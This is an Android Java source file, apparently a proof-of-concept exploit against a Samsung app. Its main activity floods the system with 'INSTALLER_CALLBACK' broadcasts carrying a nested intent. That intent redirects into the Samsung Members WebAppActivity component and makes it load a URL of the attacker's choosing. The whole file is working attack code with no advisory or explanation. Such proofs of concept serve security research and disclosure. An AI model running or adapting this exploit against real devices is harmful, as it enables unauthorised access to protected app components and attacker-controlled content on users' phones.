package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Thread(() -> {
            Intent next = new Intent();
            next.setClassName("com.samsung.android.voc", "com.samsung.consent.carta.WebAppActivity");
            next.putExtra("url", "http://example.com/");

            Intent i = new Intent("INSTALLER_CALLBACK");
            i.putExtra("android.content.pm.extra.STATUS", -1);
            i.putExtra("android.intent.extra.INTENT", next);
            while (true) {
                sendBroadcast(i);
                try {
                    Thread.sleep(100);
                } catch (Throwable th) {
                    throw new RuntimeException(th);
                }
            }
        }).start();
    }
}